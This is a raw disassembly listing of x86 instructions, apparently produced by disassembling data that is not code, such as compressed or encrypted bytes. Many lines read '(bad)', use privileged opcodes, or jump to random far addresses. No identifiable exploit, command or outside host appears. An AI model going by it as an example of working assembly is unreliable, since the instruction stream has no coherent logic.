  41e808:	sbb    eax,0x1b5a66bb
  41e80d:	shl    DWORD PTR [ebx],cl
  41e80f:	mov    bl,0x0
	...
  41e871:	add    BYTE PTR [eax],al
  41e873:	add    BYTE PTR ds:0x9e5c8a39,ch
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e8a5
  41e881:	xor    eax,0x44a0ef8e
  41e886:	add    DWORD PTR [eax],eax
  41e888:	add    al,0x1
  41e88a:	add    BYTE PTR [eax],al
  41e88c:	scas   eax,DWORD PTR es:[edi]
  41e88d:	adc    DWORD PTR [edi+edx*4+0x7366f67c],esp
  41e894:	lds    ebx,FWORD PTR [ebp+0x5e]
  41e897:	cli    
  41e898:	push   ss
  41e899:	ins    BYTE PTR es:[edi],dx
  41e89a:	icebp  
  41e89b:	push   ds
  41e89c:	mov    ch,BYTE PTR [ebx]
  41e89e:	mov    bl,0x10
  41e8a0:	into   
  41e8a1:	pusha  
  41e8a2:	out    dx,al
  41e8a3:	add    al,0x8e
  41e8a5:	popf   
  41e8a6:	push   esi
  41e8a7:	fwait
  41e8a8:	mov    ebp,0xb9b4d08c
  41e8ad:	pop    ebp
  41e8ae:	jae    0x41e918
  41e8b0:	idiv   DWORD PTR [ecx-0x5443162]
  41e8b6:	dec    ebx
  41e8b7:	pusha  
  41e8b8:	or     esp,DWORD PTR ds:0xea384228
  41e8be:	icebp  
  41e8bf:	push   ecx
  41e8c0:	rcl    ah,1
  41e8c2:	fcomi  st,st(0)
  41e8c4:	ret    
  41e8c5:	mov    al,ds:0x9b1b20c0
  41e8ca:	adc    BYTE PTR [edx-0x3e636174],dh
  41e8d0:	rcr    BYTE PTR [esi+0x699f5d7],1
  41e8d6:	jns    0x41e92b
  41e8d8:	jns    0x41e89d
  41e8da:	clc    
  41e8db:	sbb    cl,ah
  41e8dd:	and    DWORD PTR [ecx],edx
  41e8df:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8e0:	ss xchg ebp,eax
  41e8e2:	in     eax,dx
  41e8e3:	pop    ebp
  41e8e4:	dec    ebp
  41e8e5:	fld    QWORD PTR [edx]
  41e8e7:	sub    DWORD PTR [eax+0x235462ce],eax
  41e8ed:	outs   dx,DWORD PTR ds:[esi]
  41e8ee:	sub    ah,bl
  41e8f0:	rcl    ch,cl
  41e8f2:	mov    edx,0xc99546cc
  41e8f7:	mov    edx,DWORD PTR [edx+ebx*2+0x67]
  41e8fb:	retf   0xcc4d
  41e8fe:	and    al,0x9e
  41e900:	add    edi,DWORD PTR [esi-0x4122408e]
  41e906:	pop    esp
  41e907:	mov    ds:0x114b4a1b,eax
  41e90c:	inc    esp
  41e90d:	ds dec ebx
  41e90f:	sub    BYTE PTR [ebx+ebp*8+0x1b],bh
  41e913:	dec    ebp
  41e914:	ss sbb ecx,esp
  41e917:	dec    eax
  41e918:	or     edx,DWORD PTR [esi-0xa]
  41e91b:	aaa    
  41e91c:	xor    al,0xf3
  41e91e:	mov    edx,0x690b732a
  41e923:	jns    0x41e936
  41e925:	pop    ebx
  41e926:	jle    0x41e963
  41e928:	or     al,0x39
  41e92a:	mov    ah,0x15
  41e92c:	or     edi,DWORD PTR es:[eax+0xdb614c7]
  41e933:	lds    esp,FWORD PTR [edi+0x7d458459]
  41e939:	das    
  41e93a:	cmp    al,0xa2
  41e93c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e93d:	mov    cl,0x6b
  41e93f:	xor    BYTE PTR [edi+0x1c714416],dl
  41e945:	xchg   BYTE PTR [ecx+0xc6a46e1],bh
  41e94b:	dec    esp
  41e94c:	jmp    0xc3a3a9ef
  41e951:	lds    esp,FWORD PTR [edi-0x76]
  41e954:	sti    
  41e955:	es scas al,BYTE PTR es:[edi]
  41e957:	(bad)  
  41e958:	loope  0x41e993
  41e95a:	jne    0x41e9c5
  41e95c:	std    
  41e95d:	gs push 0xffffffb8
  41e960:	jmp    0x43d2fe92
  41e965:	fwait
  41e966:	sub    DWORD PTR [edi+0x76],0x12
  41e96a:	xchg   edx,eax
  41e96b:	sub    ebp,DWORD PTR [edx*1+0x536df553]
  41e972:	bound  esp,QWORD PTR [ecx-0x5984c24f]
  41e978:	jmp    0x4723:0xafa03432
  41e97f:	mov    ch,0xf9
  41e981:	jno    0x41e971
  41e983:	ret    
  41e984:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e985:	lock cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e987:	fwait
  41e988:	push   esi
  41e989:	cmp    ah,BYTE PTR [ebp+ecx*2+0x1de6de90]
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	jno    0x41e982
  41ea02:	jecxz  0x41ea51
  41ea04:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ea05:	inc    ebp
  41ea06:	add    DWORD PTR [eax],eax
  41ea08:	add    al,0x1
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	cmc    
  41ea0d:	mov    BYTE PTR [eax+0x3b],cl
  41ea10:	jmp    0x47ad:0x65487d76
  41ea17:	daa    
  41ea18:	das    
  41ea19:	add    al,0x7b
  41ea1b:	(bad)  
  41ea1d:	arpl   WORD PTR [esi+edx*2-0x78],sp
  41ea21:	mov    esi,0x674c9509
  41ea26:	hlt    
  41ea27:	cdq    
  41ea28:	push   ebx
  41ea29:	scas   eax,DWORD PTR es:[edi]
  41ea2a:	addr16 inc ebx
  41ea2c:	mov    ds:0x9c3441ca,eax
  41ea31:	xlat   BYTE PTR ds:[ebx]
  41ea32:	sbb    al,0x53
  41ea34:	pop    eax
  41ea35:	imul   eax,DWORD PTR [edx-0x5a],0xdd50aa5e
  41ea3c:	jne    0x41eaa1
  41ea3e:	mov    ah,0xf
  41ea40:	mov    cl,BYTE PTR [edx+ecx*4]
  41ea43:	in     eax,dx
  41ea44:	push   ss
  41ea45:	inc    ebp
  41ea46:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea47:	jno    0x41ea93
  41ea49:	pop    esp
  41ea4a:	outs   dx,BYTE PTR ds:[esi]
  41ea4b:	cmp    DWORD PTR [ebx+0x48],0x3e
  41ea4f:	push   cs
  41ea50:	jl     0x41ea40
  41ea52:	and    eax,0xeb49565b
  41ea57:	sub    DWORD PTR [ebx],edi
  41ea59:	xor    al,0x6f
  41ea5b:	sbb    eax,0xa2eadb02
  41ea60:	call   ebx
  41ea62:	mov    esi,0xda43a909
  41ea67:	or     ch,al
  41ea69:	dec    ecx
  41ea6a:	cli    
  41ea6b:	add    al,0xe5
  41ea6d:	push   esi
  41ea6e:	mov    esp,0x5802553a
  41ea73:	lods   al,BYTE PTR ds:[esi]
  41ea74:	push   es
  41ea75:	hlt    
  41ea76:	mov    dl,0x61
  41ea78:	and    DWORD PTR [ebx+0x4f0d0862],eax
  41ea7e:	imul   bp,WORD PTR [edi],0xf3fd
  41ea83:	ss lock sti 
  41ea86:	cmp    ah,bl
  41ea88:	xor    al,0x36
  41ea8a:	fmul   DWORD PTR [edi-0x4d]
  41ea8d:	cmc    
  41ea8e:	dec    esp
  41ea8f:	push   eax
  41ea90:	mov    ebp,0x3fded450
  41ea95:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea96:	mov    ds,WORD PTR [edi+0x1253b3e0]
  41ea9c:	push   cs
  41ea9d:	test   DWORD PTR [ebp+0x6f3b8ed5],esp
  41eaa3:	fisub  WORD PTR [ebx]
  41eaa5:	push   0xffffffd3
  41eaa7:	pop    edx
  41eaa8:	leave  
  41eaa9:	dec    edx
  41eaaa:	pushf  
  41eaab:	xor    al,BYTE PTR [ebx-0x67]
  41eaae:	aam    0x2c
  41eab0:	cmp    DWORD PTR [eax+0x23d93eac],0xffffff88
  41eab7:	jl     0x41eaa7
  41eab9:	or     ebx,ebp
  41eabb:	ror    BYTE PTR [eax],cl
  41eabd:	xlat   BYTE PTR ds:[ebx]
  41eabe:	ret    
  41eabf:	mov    BYTE PTR [ebx-0x18d552b7],0x36
  41eac6:	xchg   DWORD PTR [edx+eiz*4],edi
  41eac9:	call   0xfa4:0x622c10e8
  41ead0:	mov    esi,0x6034590d
  41ead5:	cli    
  41ead6:	outs   dx,BYTE PTR ds:[esi]
  41ead7:	jae    0x41eaf9
  41ead9:	lock icebp 
  41eadb:	daa    
  41eadc:	ss jmp 0xe9ec:0xfada141e
  41eae4:	adc    al,0x5a
  41eae6:	or     al,0x71
  41eae8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eae9:	dec    edx
  41eaea:	fmul   QWORD PTR [esi-0x7025f69c]
  41eaf0:	adc    esp,ebp
  41eaf2:	inc    esi
  41eaf3:	test   BYTE PTR [esi-0x53d2f3da],0x58
  41eafa:	inc    ecx
  41eafb:	add    BYTE PTR [esi],0x14
  41eafe:	inc    eax
  41eaff:	sbb    edi,ebp
  41eb01:	and    BYTE PTR [ecx-0x25],ch
  41eb04:	shr    DWORD PTR [edi+eiz*8-0x22],1
  41eb08:	in     eax,0xab
  41eb0a:	jmp    0x5a4bebcc
  41eb0f:	pop    edx
	...
  41eb74:	adc    ch,BYTE PTR [edi]
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x30
  41eb81:	pop    edx
  41eb82:	mov    BYTE PTR [eax+ebp*4+0x46],0x1
  41eb87:	add    BYTE PTR [ecx+eax*1],al
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	aaa    
  41eb8d:	pop    eax
  41eb8e:	cmc    
  41eb8f:	scas   eax,DWORD PTR es:[edi]
  41eb90:	sbb    ah,BYTE PTR [ecx-0x34]
  41eb93:	loopne 0x41ebcd
  41eb95:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb96:	je     0x41ebcb
  41eb98:	jns    0x41ebb7
  41eb9a:	test   eax,esp
  41eb9c:	out    0xfb,al
  41eb9e:	adc    edx,DWORD PTR [eax]
  41eba0:	jno    0x41eb3a
  41eba2:	pop    edi
  41eba3:	or     eax,DWORD PTR [ebp+0x28c40a5c]
  41eba9:	sub    eax,0x2303be45
  41ebae:	mov    ebp,0x4954efbe
  41ebb3:	sbb    eax,0xf745541a
  41ebb8:	outs   dx,DWORD PTR ds:[esi]
  41ebb9:	xchg   esi,eax
  41ebba:	xchg   DWORD PTR [esi+edi*1+0x7e],eax
  41ebbe:	xor    ch,BYTE PTR [edi+0x7d]
  41ebc1:	jns    0x41ec11
  41ebc3:	cmc    
  41ebc4:	jg     0x41ebe7
  41ebc6:	cmp    edi,DWORD PTR ds:0x50a54513
  41ebcc:	dec    esi
  41ebcd:	xor    edx,eax
  41ebcf:	pop    ss
  41ebd0:	jmp    0xe7c1:0xc8b4e2cf
  41ebd7:	inc    ebx
  41ebd8:	out    0xd5,al
  41ebda:	xor    edi,DWORD PTR [edi+0x28c5039b]
  41ebe0:	xchg   ebp,eax
  41ebe1:	mov    ecx,0x1bb6ca36
  41ebe6:	or     bh,BYTE PTR [ebx-0x5e]
  41ebe9:	ins    BYTE PTR es:[edi],dx
  41ebea:	xchg   ebp,eax
  41ebeb:	dec    edx
  41ebec:	add    DWORD PTR [eax-0x21],esi
  41ebef:	pop    ebp
  41ebf0:	hlt    
  41ebf1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebf2:	sub    al,cl
  41ebf4:	shl    edx,cl
  41ebf6:	sub    ebx,ebx
  41ebf8:	add    eax,0xfc132625
  41ebfd:	sub    DWORD PTR [edi],edx
  41ebff:	enter  0x82bb,0x4b
  41ec03:	xor    edx,DWORD PTR [edi-0x39fe3335]
  41ec09:	jmp    0xd08a9a62
  41ec0e:	cmp    dh,cl
  41ec10:	in     eax,0x77
  41ec12:	call   0xbf17ea7a
  41ec17:	dec    ebx
  41ec18:	dec    esp
  41ec19:	mov    edx,0xb830beb
  41ec1e:	push   cs
  41ec1f:	and    DWORD PTR [edx+0x24],edi
  41ec22:	sub    edx,DWORD PTR [eax]
  41ec24:	aas    
  41ec25:	retf   
  41ec26:	jo     0x41ec11
  41ec28:	add    dh,BYTE PTR [ebp+0x2add40e9]
  41ec2e:	pop    ss
  41ec2f:	push   ss
  41ec30:	mov    al,ds:0x1b4664c5
  41ec35:	mov    bh,0xd0
  41ec37:	xor    bh,BYTE PTR [eax-0x23]
  41ec3a:	sbb    BYTE PTR [edi+0x27],0xf2
  41ec3e:	pop    edi
  41ec3f:	std    
  41ec40:	out    0xac,eax
  41ec42:	shr    DWORD PTR [ecx+0x5a],cl
  41ec45:	sub    BYTE PTR [edi],dh
  41ec47:	xor    bh,BYTE PTR [ecx-0x24249f95]
  41ec4d:	mov    esi,DWORD PTR [edi]
  41ec4f:	jae    0x41ec9b
  41ec51:	jno    0x41ec8d
  41ec53:	push   esp
  41ec54:	jmp    0xa1e4:0xe36e1592
  41ec5b:	shl    eax,0x45
  41ec5e:	or     BYTE PTR [ebx],0x74
  41ec61:	xchg   esp,eax
  41ec62:	sub    al,bh
  41ec64:	inc    BYTE PTR [esp+esi*8-0x13820ed7]
  41ec6b:	faddp  st(0),st
  41ec6d:	lea    ebp,[ebp+0x2c]
  41ec70:	xchg   ecx,eax
  41ec71:	rcr    BYTE PTR [esi-0x19139e0f],1
  41ec77:	push   edx
  41ec78:	mov    dl,0xb6
  41ec7a:	add    cl,ch
  41ec7c:	pop    esi
  41ec7d:	nop
  41ec7e:	jbe    0x41ec14
  41ec80:	push   ds
  41ec81:	push   esi
  41ec82:	(bad)  
  41ec84:	adc    eax,0x30770bf2
  41ec89:	(bad)  
  41ec8a:	aad    0x42
  41ec8c:	lds    ebp,FWORD PTR [ecx+ebp*4]
  41ec8f:	int    0x0
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0x6e925fd0
  41ed02:	cmp    esp,0xffffffac
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	mov    ?,WORD PTR [eax]
  41ed0e:	mov    edi,0x109323c2
  41ed13:	xor    eax,0xff4e6177
  41ed18:	dec    esi
  41ed19:	je     0x41ed65
  41ed1b:	ret    0x25f8
  41ed1e:	and    edx,DWORD PTR [eax+eax*8]
  41ed21:	dec    ecx
  41ed22:	inc    esi
  41ed23:	(bad)  
  41ed24:	mov    ds:0x40af7112,al
  41ed29:	mov    ch,BYTE PTR [ebx+ebp*2-0x4e]
  41ed2d:	jae    0x41ed11
  41ed2f:	dec    ebx
  41ed30:	pop    esp
  41ed32:	(bad)  
  41ed33:	ins    DWORD PTR es:[edi],dx
  41ed34:	mov    dh,0x5f
  41ed36:	dec    edx
  41ed37:	push   eax
  41ed38:	pop    ecx
  41ed39:	es xchg esi,eax
  41ed3b:	cmp    edx,DWORD PTR ds:0x39e8a147
  41ed41:	mov    edi,0x9ef11a9f
  41ed46:	and    eax,DWORD PTR [esi]
  41ed48:	inc    ebx
  41ed49:	push   0x798df946
  41ed4e:	(bad)
  41ed51:	std    
  41ed52:	mov    gs,WORD PTR [eax]
  41ed54:	sbb    cl,ah
  41ed56:	xor    al,ah
  41ed58:	cdq    
  41ed59:	es push eax
  41ed5b:	(bad)  
  41ed5c:	das    
  41ed5d:	xor    BYTE PTR [edi],0x58
  41ed60:	ficom  DWORD PTR [eax+ecx*1-0x5b]
  41ed64:	adc    ecx,DWORD PTR [ebp-0x5b]
  41ed67:	and    BYTE PTR [eax],bl
  41ed69:	test   WORD PTR [esi-0x74],bp
  41ed6d:	jb     0x41ed0b
  41ed6f:	or     dh,BYTE PTR [ebx+esi*1-0x763386a5]
  41ed76:	gs mov ebp,0x18d2f35e
  41ed7c:	inc    ecx
  41ed7d:	ja     0x41ed15
  41ed7f:	and    eax,0xb07315a1
  41ed84:	das    
  41ed85:	xchg   DWORD PTR [ebp+0x31],edi
  41ed88:	mov    al,0xd8
  41ed8a:	sbb    BYTE PTR [ebx+0x3d],dh
  41ed8d:	jo     0x41ed10
  41ed8f:	popf   
  41ed90:	mov    ah,0xfd
  41ed92:	pop    esp
  41ed93:	cmp    ebp,DWORD PTR [esi+0x65]
  41ed96:	es and dl,dh
  41ed99:	ins    DWORD PTR es:[edi],dx
  41ed9a:	jne    0x41ed32
  41ed9c:	xor    BYTE PTR [edx],bl
  41ed9e:	dec    ebp
  41ed9f:	cmc    
  41eda0:	xchg   BYTE PTR [ecx-0x3f459c45],bl
  41eda6:	sbb    esp,DWORD PTR [ecx+0x33]
  41eda9:	inc    eax
  41edaa:	ins    BYTE PTR es:[edi],dx
  41edab:	je     0x41ed31
  41edad:	or     eax,0x1d36695d
  41edb2:	xchg   edi,eax
  41edb3:	mov    esi,0x181272c1
  41edb8:	ret    0x624b
  41edbb:	sbb    bl,0x66
  41edbe:	into   
  41edbf:	popa   
  41edc0:	mov    al,ds:0x970d1f42
  41edc5:	loope  0x41ee0e
  41edc7:	sub    eax,0x6779a641
  41edcc:	idiv   bl
  41edce:	jb     0x41ed85
  41edd0:	jns    0x41ee15
  41edd2:	fwait
  41edd3:	cli    
  41edd4:	jp     0x41ee2a
  41edd6:	fld    DWORD PTR [ebx+0x76]
  41edd9:	and    ebx,edx
  41eddb:	repz sub al,0xe
  41edde:	add    DWORD PTR [eax+esi*2-0x22ba29c8],0xffffffa7
  41ede6:	mov    dl,0xcf
  41ede8:	push   0xfe7d81f3
  41eded:	std    
  41edee:	push   edx
  41edef:	(bad)  
  41edf1:	mov    ecx,0x8851b930
  41edf6:	lahf   
  41edf7:	xchg   edi,eax
  41edf8:	sbb    DWORD PTR [edi+0x3400d7e7],eax
  41edfe:	sbb    al,0xd2
  41ee00:	aam    0xce
  41ee02:	shl    ebp,1
  41ee04:	test   al,0x2
  41ee06:	in     eax,0x8a
  41ee08:	retf   
  41ee09:	adc    DWORD PTR [ebx-0x7b3db99d],ebp
  41ee0f:	sub    al,BYTE PTR [eax]
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb02d:0xfb0451e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	call   0xb4a5:0xf5d97cb6
  41ee93:	jmp    0x67c8a952
  41ee98:	mov    cl,0xa9
  41ee9a:	retf   0xfd74
  41ee9d:	sahf   
  41ee9e:	mov    cl,0x9d
  41eea0:	dec    ecx
  41eea1:	adc    BYTE PTR [edi-0x7cb9b9f6],ch
  41eea7:	inc    ecx
  41eea8:	xor    al,0xe
  41eeaa:	sbb    eax,0x37f6f95d
  41eeaf:	cmp    BYTE PTR [eax+0x9aa75ea],dh
  41eeb5:	sbb    BYTE PTR [edi],dl
  41eeb7:	or     BYTE PTR [ecx+0x4d],bl
  41eeba:	rcr    BYTE PTR [edx-0x45],cl
  41eebd:	cmp    eax,0x63d5e25e
  41eec2:	gs outs dx,DWORD PTR cs:[esi]
  41eec5:	mov    bh,0xee
  41eec7:	cmp    al,0xbf
  41eec9:	dec    edx
  41eeca:	or     eax,0xb2e7da5a
  41eecf:	cmp    edx,DWORD PTR [esi-0x6fa0da3f]
  41eed5:	enter  0x11d8,0x69
  41eed9:	neg    DWORD PTR [esi-0x3a990695]
  41eedf:	mov    ah,0xd9
  41eee1:	jle    0x41ef53
  41eee3:	mov    eax,ds:0x446f41fe
  41eee8:	loop   0x41ee7b
  41eeea:	or     al,BYTE PTR [eax+eiz*4-0x70]
  41eeee:	stos   DWORD PTR es:[edi],eax
  41eeef:	cmp    eax,0xbfc7e8bd
  41eef4:	(bad)  
  41eef5:	lds    ecx,FWORD PTR [eax+0x26]
  41eef8:	cli    
  41eef9:	fcomp  DWORD PTR [ebx-0x18]
  41eefc:	ins    BYTE PTR es:[edi],dx
  41eefd:	and    DWORD PTR [edx-0x55],ecx
  41ef00:	ret    0x90f5
  41ef03:	pop    ds
  41ef04:	and    bh,cl
  41ef06:	cmp    eax,0xe8b2f836
  41ef0b:	mov    eax,0x904ac4e9
  41ef10:	ja     0x41eed0
  41ef12:	ja     0x41ef68
  41ef14:	aad    0x33
  41ef16:	cmp    ch,BYTE PTR [ecx]
  41ef18:	mov    esp,0x8ef3eac9
  41ef1d:	xchg   BYTE PTR [ebx-0x6],al
  41ef20:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef21:	jecxz  0x41ef74
  41ef23:	(bad)  [edi]
  41ef25:	and    BYTE PTR [edi],dl
  41ef27:	pop    esp
  41ef28:	call   0x23c8:0xd2722799
  41ef2f:	pop    eax
  41ef30:	sub    eax,0x3d8206a6
  41ef35:	jbe    0x41ef93
  41ef37:	stc    
  41ef38:	xchg   edx,eax
  41ef39:	inc    ebx
  41ef3a:	cwde   
  41ef3b:	adc    DWORD PTR [esi],0x8ffed89f
  41ef41:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ef42:	aad    0x8f
  41ef44:	ret    0xe9dd
  41ef47:	cdq    
  41ef48:	cmp    ch,BYTE PTR [edi-0x4e1e535a]
  41ef4e:	xor    cl,dl
  41ef50:	lock jmp 0x32220adb
  41ef56:	scas   al,BYTE PTR es:[edi]
  41ef57:	lods   al,BYTE PTR ds:[esi]
  41ef58:	(bad)  
  41ef59:	sbb    ebp,esp
  41ef5b:	out    dx,eax
  41ef5c:	aam    0x16
  41ef5e:	lods   al,BYTE PTR ds:[esi]
  41ef5f:	icebp  
  41ef60:	xlat   BYTE PTR ds:[ebx]
  41ef61:	adc    bl,dh
  41ef63:	jmp    0x41efa8
  41ef65:	jne    0x41ef9a
  41ef67:	or     eax,0xd86e221e
  41ef6c:	pop    ss
  41ef6d:	xor    ecx,0x66089e85
  41ef73:	mov    DWORD PTR [edx],edi
  41ef75:	mov    ebp,0x1953b8cf
  41ef7a:	leave  
  41ef7b:	cmp    ebx,DWORD PTR [ecx]
  41ef7d:	je     0x41efce
  41ef7f:	fisubr DWORD PTR [eax-0x7c5cee9d]
  41ef85:	pop    edx
  41ef86:	cmp    DWORD PTR [eax],eax
  41ef88:	hlt    
  41ef89:	mov    bh,0xc4
  41ef8b:	jbe    0x41ef9b
  41ef8d:	call   0x422f99
	...
  41eff2:	add    BYTE PTR [eax],al
  41eff4:	mov    ecx,0xff25bf5d
  41eff9:	out    0xbb,eax
  41effb:	fisttp QWORD PTR [ecx+0x0]
  41effe:	lock imul ebp,DWORD PTR [eax-0x3d],0xffffffb5
  41f003:	push   ds
  41f004:	mov    ah,0x49
  41f006:	add    DWORD PTR [eax],eax
  41f008:	add    al,0x1
  41f00a:	add    BYTE PTR [eax],al
  41f00c:	xchg   edx,eax
  41f00d:	daa    
  41f00e:	(bad)  
  41f00f:	js     0x41effd
  41f011:	pop    eax
  41f012:	sub    eax,0x17795a4d
  41f017:	es sub eax,0x7c578aa6
  41f01d:	sbb    eax,0xae58bfde
  41f022:	fcmovnbe st,st(7)
  41f024:	xlat   BYTE PTR ds:[ebx]
  41f025:	cmp    DWORD PTR [esi],0xffffffe4
  41f028:	inc    ebp
  41f029:	cmp    DWORD PTR [ebp-0x7df5d2a9],esp
  41f02f:	pushf  
  41f030:	inc    edi
  41f031:	mov    ebp,0xa1c5f01c
  41f036:	loop   0x41f097
  41f038:	jge    0x41f079
  41f03a:	(bad)  
  41f03b:	retf   0xc04b
  41f03e:	sbb    BYTE PTR [ebx+0x6744f226],bl
  41f044:	mov    ebx,0x883382ef
  41f049:	mov    ebx,0xdd86dc0
  41f04e:	cwde   
  41f04f:	(bad)  
  41f050:	xchg   ebp,eax
  41f051:	xchg   edx,eax
  41f052:	cld    
  41f053:	(bad)  
  41f054:	bound  ecx,QWORD PTR [esi-0x44a67896]
  41f05a:	mov    eax,0x34878344
  41f05f:	mov    esi,0xccf542b5
  41f064:	adc    sp,WORD PTR [ecx-0x17]
  41f068:	hlt    
  41f069:	dec    esi
  41f06a:	ret    0xc696
  41f06d:	pop    edi
  41f06e:	xchg   DWORD PTR [ebp+0x1f],edx
  41f071:	mov    DWORD PTR [ebx],ebp
  41f073:	into   
  41f074:	or     BYTE PTR [esi],bh
  41f076:	(bad)  
  41f077:	int3   
  41f078:	(bad)  
  41f079:	add    BYTE PTR es:[ecx],ch
  41f07c:	push   es
  41f07d:	pop    ebp
  41f07e:	sbb    al,0x85
  41f080:	xlat   BYTE PTR ds:[ebx]
  41f081:	loopne 0x41f068
  41f083:	sub    eax,0xa918d8ac
  41f088:	inc    edx
  41f089:	add    eax,0xdb568ab4
  41f08e:	add    eax,edx
  41f090:	ror    bl,1
  41f092:	pop    ecx
  41f093:	pushf  
  41f094:	daa    
  41f095:	inc    ecx
  41f096:	mov    eax,ds:0xe431629b
  41f09b:	(bad)  
  41f09c:	jae    0x41f049
  41f09e:	add    eax,0xc19d060b
  41f0a3:	lea    edx,[esi+0x7]
  41f0a6:	xchg   esi,eax
  41f0a7:	mov    al,BYTE PTR [ebx+edi*1+0x59be84da]
  41f0ae:	xor    DWORD PTR [ecx+0x7d],0x6fc043f3
  41f0b5:	jecxz  0x41f108
  41f0b7:	cld    
  41f0b8:	sbb    ebx,edx
  41f0ba:	pop    edx
  41f0bb:	popa   
  41f0bc:	xchg   esp,eax
  41f0bd:	push   edx
  41f0be:	push   edi
  41f0bf:	lds    ecx,FWORD PTR [edx-0x346f7ff2]
  41f0c5:	adc    ebp,ebp
  41f0c7:	fist   WORD PTR [ebx+esi*2+0x2c]
  41f0cb:	xchg   dh,ch
  41f0cd:	push   esp
  41f0ce:	nop    DWORD PTR [esi+0x285c1f5]
  41f0d5:	pop    es
  41f0d6:	cmc    
  41f0d7:	or     dl,BYTE PTR [edi-0x55]
  41f0da:	adc    BYTE PTR [ebx],dh
  41f0dc:	and    DWORD PTR [edx+0x69],eax
  41f0df:	in     eax,0xab
  41f0e1:	push   edx
  41f0e2:	daa    
  41f0e3:	stos   DWORD PTR es:[edi],eax
  41f0e4:	pop    sp
  41f0e6:	xor    edi,DWORD PTR [eax+0x5a27ca85]
  41f0ec:	ins    DWORD PTR es:[edi],dx
  41f0ed:	jg     0x41f0c4
  41f0ef:	call   0xcb583c22
  41f0f4:	cs and esp,eax
  41f0f7:	scas   eax,DWORD PTR es:[edi]
  41f0f8:	xchg   BYTE PTR [eax+0x11b30045],bh
  41f0fe:	mov    al,0x37
  41f100:	mov    dl,0x6f
  41f102:	xchg   esp,eax
  41f103:	iret   
  41f104:	add    dl,bl
  41f106:	cs aaa 
  41f108:	and    bl,dl
  41f10a:	call   0x6e23fb13
  41f10f:	dec    edi
	...
  41f174:	fild   QWORD PTR [edx+ebp*1+0x6c]
  41f179:	mov    ebx,0x3824ffdf
  41f17e:	(bad)  
  41f17f:	jmp    0x4ab8:0x4f0faa88
  41f186:	add    DWORD PTR [eax],eax
  41f188:	add    al,0x1
  41f18a:	add    BYTE PTR [eax],al
  41f18c:	in     eax,dx
  41f18d:	dec    edi
  41f18e:	or     al,0xd8
  41f190:	(bad)  
  41f191:	xchg   esi,eax
  41f192:	sub    DWORD PTR [esi-0x6c],ebp
  41f195:	fs cmp esp,esi
  41f198:	or     DWORD PTR [edx+0x1a334c0c],edi
  41f19e:	inc    edi
  41f19f:	dec    ecx
  41f1a0:	leave  
  41f1a1:	inc    esi
  41f1a2:	pop    esp
  41f1a3:	xchg   DWORD PTR [bp+di-0x75],edx
  41f1a7:	pop    ebx
  41f1a8:	ss mov ecx,0x509cdc92
  41f1ae:	mov    bh,0xd3
  41f1b0:	xlat   BYTE PTR ds:[ebx]
  41f1b1:	lock pop edx
  41f1b3:	arpl   WORD PTR ds:0xe4d48c59,cx
  41f1b9:	clc    
  41f1ba:	dec    esp
  41f1bb:	psubusw mm2,QWORD PTR [eax]
  41f1be:	cmp    DWORD PTR [edi+0x50],0x4c8a8ca5
  41f1c5:	lods   eax,DWORD PTR ds:[esi]
  41f1c6:	jno    0x41f21c
  41f1c8:	retf   
  41f1c9:	xchg   edx,eax
  41f1ca:	sub    dh,BYTE PTR [di]
  41f1cd:	xchg   edi,eax
  41f1ce:	iret   
  41f1cf:	pop    edi
  41f1d0:	enter  0xb48a,0x6b
  41f1d4:	lods   al,BYTE PTR gs:[esi]
  41f1d6:	adc    ecx,DWORD PTR [eax+0xb]
  41f1d9:	lea    edi,[edi+edx*2-0x29]
  41f1dd:	fsub   DWORD PTR [esi+0x17a25f8d]
  41f1e3:	and    ch,bh
  41f1e5:	pop    edx
  41f1e6:	out    dx,al
  41f1e7:	ret    0x606a
  41f1ea:	xor    al,0x12
  41f1ec:	out    0x1a,al
  41f1ee:	lock outs dx,DWORD PTR ds:[esi]
  41f1f0:	add    BYTE PTR [edx+ebx*1+0xa],bl
  41f1f4:	fs out 0x4f,al
  41f1f7:	lahf   
  41f1f8:	fsubrp st(7),st
  41f1fa:	adc    DWORD PTR [edi-0x69026214],esi
  41f200:	push   cs
  41f201:	adc    DWORD PTR [ecx+ecx*1+0x52b8e05b],ebp
  41f208:	push   0x4cdd0ee7
  41f20d:	mov    ecx,DWORD PTR [edi+0x4e]
  41f210:	fiadd  WORD PTR [edi]
  41f212:	in     eax,dx
  41f213:	cld    
  41f214:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
